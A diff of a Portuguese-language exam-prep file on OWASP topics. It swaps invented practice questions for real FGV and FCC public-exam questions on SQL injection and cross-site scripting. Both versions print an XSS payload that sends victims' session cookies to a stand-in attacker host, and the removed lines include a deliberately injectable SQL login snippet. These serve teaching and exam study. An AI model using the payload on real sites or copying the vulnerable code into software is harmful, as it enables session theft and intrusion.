@@ -173,108 +173,90 @@ No contexto das vulnerabilidades catalogadas pelo **OWASP Top 10**, essa falha �
 ---
 
 ### Teste 389
-**(Questão Inédita / Simulada Estilo FCC – Nível: Controle Externo / TI)**
-No ranking OWASP Top 10:2021, a categoria **A02:2021 - Cryptographic Failures** aborda falhas relacionadas à ausência ou fragilidade de criptografia na proteção de dados sensíveis em repouso e em trânsito.
+**(FGV – TRT-13 – Analista Judiciário (TI) – 2022)**  
+De acordo com o OWASP, uma aplicação web fica vulnerável a ataques de Injeção quando
 
-No desenvolvimento de sistemas de processo judicial e administrativo eletrônico, a diretriz recomendada pela OWASP e pelo NIST para armazenar senhas de usuários em bancos de dados de forma estritamente segura consiste em:
-
-* **A)** Cifrar as senhas utilizando o algoritmo simétrico DES em modo ECB sem chave secreta.
-* **B)** Armazenar as senhas aplicando uma função hash rápida simples como MD5 ou SHA-1 pura sem qualquer valor de sal (*salt*).
-* **C)** Utilizar uma função de derivação de chaves adaptativa e deliberadamente lenta com alto consumo de memória (*memory-hard* / *work factor* ajustável), tais como **Argon2id**, **bcrypt** ou **PBKDF2**, combinada com um **Salt** criptograficamente aleatório e exclusivo para cada usuário gerado com no mínimo 128 bits.
-* **D)** Gravar as senhas em texto puro (*plaintext*) protegido apenas por permissão de arquivo no Linux.
-* **E)** Converter a senha em caracteres Base64 invertidos e armazenar em uma coluna pública da tabela de usuários.
-
+* **A)** ocorre uso intenso de expressões regulares em operações de validação dados.
+* **B)** se impõe o menor nível de privilégio para aplicação conect ar a bancos de dados ou outros sistemas de suporte.
+* **C)** ferramentas de mapeamento objeto -relacional são adotadas para reduzir a impedância da programação.
+* **D)** se utiliza a cláusula LIMIT para especificar o número de linhas que devem ser retornadas no resultado de uma consulta SQL.
+* **E)** consultas SQL são concatenadas diretamente com os dados fornecidos pelos usuários por meio de formulários web.
 
 ---
 
 > **Comentário Detalhado:**
 >
-> - **A)** Incorreta. Criptografia reversível não deve ser usada para senhas de autenticação; senhas exigem funções unidirecionais não reversíveis. Além disso, DES é um algoritmo quebrado e obsoleto.
-> - **B)** Incorreta. Hashes rápidos comuns (MD5, SHA-1, SHA-256) são catastróficos para senhas: atacantes conseguem testar bilhões de palpites por segundo em GPUs comuns e utilizar tabelas arco-íris (*Rainbow Tables*) pré-computadas na ausência de salt.
-> - **C)** **CORRETA.** Padrão ouro da OWASP e NIST SP 800-63B para armazenamento de senhas:
->   - **Salt (Sal Criptográfico):** Sequência aleatória exclusiva gerada para cada usuário e concatenada à senha antes do hash, tornando tabelas arco-íris totalmente inúteis e garantindo que dois usuários com a mesma senha tenham hashes físicos completamente distintos.
->   - **Funções de Hashing Lentas e Adaptativas (Key Derivation Functions - KDF):** Algoritmos como **Argon2id** (vencedor da *Password Hashing Competition*), **bcrypt** e **PBKDF2** impõem custos massivos de tempo e memória RAM (*memory-hard*), tornando ataques de força bruta com placas de vídeo e ASICs inviáveis economicamente.
-> - **D)** Incorreta. Violação elementar e gravíssima de segurança.
-> - **E)** Incorreta. Base64 é apenas um esquema de codificação reversível, desprovido de qualquer segurança ou segredo criptográfico.
-> 
-> **Gabarito: C**
+> - **A)** Incorreta. O uso inadequado de regex pode provocar ataques de ReDoS (Denial of Service por Regex), mas não constitui a vulnerabilidade de injeção descrita pelo OWASP.
+> - **B)** Incorreta. O princípio do menor privilégio (least privilege) é uma medida preventiva essencial de mitigação.
+> - **C)** Incorreta. Ferramentas ORM (como Hibernate ou Entity Framework) auxiliam na prevenção de SQL Injection, pois utilizam consultas parametrizadas internamente.
+> - **D)** Incorreta. A cláusula LIMIT apenas restringe a cardinalidade de linhas resultantes no SGBD.
+> - **E)** Correta. Segundo o OWASP (Top 10 - A03: Injection), as falhas de injeção ocorrem quando dados fornecidos pelo usuário não são validados, filtrados ou parametrizados pela aplicação, sendo concatenados diretamente em comandos ou consultas interpretadas (como queries SQL), permitindo ao invasor alterar a lógica pretendida do comando.
+>
+> **Gabarito: E**
 
 ---
 
 ### Teste 390
-**(Questão Inédita / Simulada Estilo FCC – Nível: Controle Externo / TI)**
-Um desenvolvedor de sistemas do Tribunal de Contas implementou a seguinte rotina de autenticação em uma API de consulta processual:
+**(FGV – TJ-AP – Analista Judiciário (TI) – 2023)**  
+A equipe de Segurança da Informação (SI) de um órgão público realizou varreduras de vulnerabilidades em seus ativos a fim de reduzir a exposição dos sistemas aos riscos. Durante a varredura, a equipe de SI identi ficou que um dos sistemas tinha uma vulnerabilidade que permitia a inserção de scripts maliciosos na aplicação, alterando o conteúdo dinâmico que o usuário recebia em seu navegador, redirecionando-o para um site falso. A vulnerabilidade identificada permitia um ataque de:
 
-```python
-# Trecho de código implementado
-query = "SELECT id, nome, perfil FROM auditores WHERE login = '" + login_input + "' AND senha = '" + senha_input + "'"
-cursor.execute(query)
-usuario = cursor.fetchone()
-```
-
-Considerando a classificação de vulnerabilidades do **OWASP Top 10** e os princípios de codificação segura, assinale a afirmativa correta:
-
-* **A)** O código é imune a ataques cibernéticos, visto que a linguagem Python trata strings concatenadas como números binários criptografados.
-* **B)** O código apresenta grave vulnerabilidade de Injeção de SQL (*SQL Injection* - A03 do OWASP).
-* **C)** A vulnerabilidade apresentada é classificada como *Cross-Site Scripting (XSS)*, e sua única forma de mitigação consiste em desativar o firewall de aplicação web (WAF).
-* **D)** A vulnerabilidade *Broken Access Control* (A01) foi abolida da lista da OWASP, não se aplicando mais ao desenvolvimento de aplicações modernas em nuvem.
-* **E)** O uso de parâmetros vinculados (*bind variables*) em consultas parametrizadas é desaconselhado pela OWASP por provocar vazamento de memória na máquina hospedeira.
-
+* **A)** backdoor;
+* **B)** rootkit;
+* **C)** session hijacking;
+* **D)** cross-site scripting;
+* **E)** SQL injection. Tribunal de Justiça do Estado do Amapá FGV Conhecimento Analista Jud - Apo Esp - Tecnologia da Informação - Segurança da Informação  Tipo 1 ̶ Branca – Página 14
 
 ---
 
 > **Comentário Detalhado:**
 >
-> - **A)** Incorreta. O interpretador Python trata a operação como concatenação literal de caracteres, montando uma consulta SQL vulnerável e desprotegida.
-> - **B)** Correta. A concatenação de dados não sanitizados permite que metacaracteres modifiquem a lógica sintática da consulta (Injeção de SQL - A03). O remédio canônico definitivo recomendado pela OWASP consiste na adoção obrigatória de consultas parametrizadas (*Prepared Statements*), onde o banco de dados compila previamente a instrução e trata as variáveis estritamente como literais de dados.
-> - **C)** Incorreta. A vulnerabilidade afeta a base de dados relacional (SQL Injection), ao passo que XSS afeta o navegador do cliente com a execução de scripts maliciosos.
-> - **D)** Incorreta. *Broken Access Control* (A01) não foi abolida; ao contrário, lidera o ranking oficial como a vulnerabilidade número 1 em aplicações web modernas.
-> - **E)** Incorreta. O uso de parâmetros vinculados (*bind variables*) é a melhor prática recomendada internacionalmente para desenvolvimento de software seguro.
-> 
-> **Gabarito: B**
-
----
-
-
-#### Modalidades de Cross-Site Scripting (XSS):
-O XSS consiste na injeção de scripts maliciosos (geralmente JavaScript) que serão executados dentro da sessão do navegador da vítima:
-
-1. **Stored XSS (Persistente):** O script malicioso injetado é salvo de forma definitiva no banco de dados da aplicação (ex.: em um campo de cadastro, mensagem de fórum ou parecer de processo) e é executado automaticamente no navegador de qualquer usuário que visualizar aquela página posteriormente.
-2. **Reflected XSS (Refletido):** O script malicioso não é salvo no banco de dados; ele é transportado na própria requisição HTTP (em um parâmetro da URL ou formulário de busca) e refletido imediatamente na página de resposta pelo servidor sem sanitização prévia.
-3. **DOM-based XSS:** A vulnerabilidade reside inteiramente no código JavaScript do lado do cliente (*client-side*). O script da página processa dados inseguros obtidos do navegador (como `document.location` ou `window.location.hash`) e os injeta perigosamente no DOM via propriedades como `innerHTML` ou `document.write`, sem que o payload malicioso precise transitar pelo servidor backend.
+> - **A)** Incorreta. Backdoors são portas dos fundos deixadas deliberadamente em sistemas para garantir persistência de acesso.
+> - **B)** Incorreta. Rootkits são conjuntos de ferramentas maliciosas que operam em nível de núcleo/privilégio para ocultar processos invasores.
+> - **C)** Incorreta. O sequestro de sessão (session hijacking) pode decorrer de roubo de cookies via XSS, mas a falha descrita no enunciado (inserção de scripts na aplicação alterando conteúdo dinâmico) é o XSS em si.
+> - **D)** Correta. O ataque de Cross-Site Scripting (XSS) consiste na inserção de scripts executáveis (como JavaScript malicioso) em páginas web dinâmicas. Ao ser renderizado no navegador da vítima, o script executa no contexto de segurança da sessão do usuário, permitindo desvio de tráfego, captura de credenciais ou roubo de cookies.
+> - **E)** Incorreta. SQL Injection atinge a camada de banco de dados no back-end, e não a injeção de scripts executados no navegador cliente.
+>
+> **Gabarito: D**
 
 ---
 
 ### Teste 391
-**(Questão Inédita / Simulada Estilo FCC – Nível: Controle Externo / TI)**
-A vulnerabilidade de *Cross-Site Scripting* (XSS) ocorre quando uma aplicação web inclui dados não confiáveis em uma página web sem a devida validação ou escape, permitindo que scripts maliciosos (geralmente JavaScript) sejam executados no navegador da vítima.
+**(FCC – TRT-24 – Analista Judiciário (TI) – 2017)**  
+Considere um cenário em que uma aplicação utiliza dados não confiáveis na construção do seguinte fragmento HTML sem vali-
 
-A literatura da OWASP e os manuais de segurança em aplicações web classificam o XSS em três modalidades primordiais: **XSS Armazenado (*Stored*)**, **XSS Refletido (*Reflected*)** e **XSS Baseado em DOM (*DOM-based*)**.
+dação ou filtro:
 
-Assinale a afirmativa que descreve corretamente o **XSS Armazenado (Stored / Persistent XSS)**:
+(String) page += "<input name='num_cartao_credito' type='TEXT' value='" +
 
-* **A)** O script hostil é enviado em uma requisição HTTP imediata (como um parâmetro de busca em link) e refletido instantaneamente na resposta do servidor sem ser persistido em banco de dados.
-* **B)** A injeção maliciosa é salva de forma persistente no banco de dados do servidor (ex.: em um campo de comentários de processo, fórum ou cadastro de fornecedor); toda vez que um usuário legítimo ou auditor carrega a página correspondente, o script hostil gravado é renderizado e executado automaticamente em seu navegador, podendo roubar cookies de sessão e realizar ações em nome da vítima.
-* **C)** O ataque ocorre exclusivamente pela manipulação do objeto `window.location` no código JavaScript local do navegador sem qualquer tráfego com o servidor.
-* **D)** O XSS armazenado afeta apenas computadores desligados sem conexão com a rede elétrica.
-* **E)** Trata-se de uma falha exclusiva de hardware que destrói a memória física do monitor de vídeo.
+request.getParameter("credit_card") + "'>";
 
+Considere, ainda, que um atacante modifica o parâmetro 'credit_card' em seu navegador para:
+
+'><script>document.location= 'http://www.atacante.com/cgi-bin/cookie.cgi?
+
+foo='+document.cookie</script>'
+
+Isso causa o envio do ID de sessão da vítima para o  site do atacante, permitindo que sequestre a sessão atual do usuário.
+
+Este é um cenário de ataque do tipo
+
+* **A)** Script-Fake Injection.
+* **B)** Session Persistent Hijacking.
+* **C)** Cross-Site Scripting.
+* **D)** Buffer Overflow.
+* **E)** Advanced Persistent Threat.
 
 ---
 
 > **Comentário Detalhado:**
 >
-> - **A)** Incorreta. Essa é a definição clássica do **XSS Refletido (Reflected XSS)**, que exige que a vítima clique em um link forjado contendo o payload no parâmetro da URL.
-> - **B)** **CORRETA.** O **XSS Armazenado (Stored / Persistent XSS)** é a variante mais devastadora:
->   - O atacante insere o código malicioso (`<script>document.location='http://hacker.com/steal?cookie='+document.cookie</script>`) em um campo de entrada persistido pela aplicação (ex.: cadastro de processo, petição, mural de avisos).
->   - O dado é gravado no banco de dados.
->   - Qualquer usuário, gestor ou auditor que posteriormente acessar a página que renderiza esse registro executa o script no contexto de segurança da sua sessão autenticada.
->   - **Defesa:** Sanitização estrita de entrada, codificação de caracteres na saída contextualmente (*Context-Aware Output Encoding*) e implementação do cabeçalho HTTP **Content Security Policy (CSP)**.
-> - **C)** Incorreta. Essa é a definição do **DOM-based XSS**, onde a vulnerabilidade reside inteiramente no código JavaScript do lado cliente que manipula o DOM.
-> - **D)** Incorreta. O ataque roda ativamente no navegador da vítima.
-> - **E)** Incorreta. Trata-se de uma vulnerabilidade de software na camada de aplicação web.
-> 
-> **Gabarito: B**
+> - **A)** Incorreta. Nomenclatura fictícia não reconhecida pela literatura e pelo OWASP.
+> - **B)** Incorreta. Nomenclatura imprecisa que não designa o padrão de injeção em código HTML.
+> - **C)** Correta. O código apresentado concatena a entrada de formulário `request.getParameter('credit_card')` diretamente na construção da tag HTML `<input>` sem sanitização ou encoding. Ao injetar `'><script>document.location='http://atacante...cookie=' + document.cookie</script>`, o atacante fecha o atributo e a tag input, forçando o navegador a executar o script malicioso e transmitir o cookie de sessão para o servidor atacante, caracterizando tipicamente um ataque de Cross-Site Scripting (XSS).
+> - **D)** Incorreta. Buffer overflow ocorre quando dados ultrapassam a capacidade de alocação de memória física em linguagens de baixo nível (C/C++).
+> - **E)** Incorreta. APT refere-se a campanhas de espionagem cibernética persistente por grupos organizados.
+>
+> **Gabarito: C**
 
 ---
 
